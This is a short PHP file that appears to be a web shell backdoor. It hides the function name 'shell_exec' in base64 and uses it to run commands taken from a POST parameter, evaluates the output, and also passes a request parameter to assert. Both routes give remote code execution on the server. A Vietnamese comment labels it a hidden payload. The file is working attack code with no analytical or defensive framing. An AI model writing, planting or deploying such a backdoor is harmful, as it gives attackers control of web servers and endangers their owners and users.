<?php
// base64_decode ẩn payload
$a = base64_decode('c2hlbGxfZXhlYw=='); // = "shell_exec"
@eval($a($_POST['x']));
assert($_REQUEST['x']);
?>
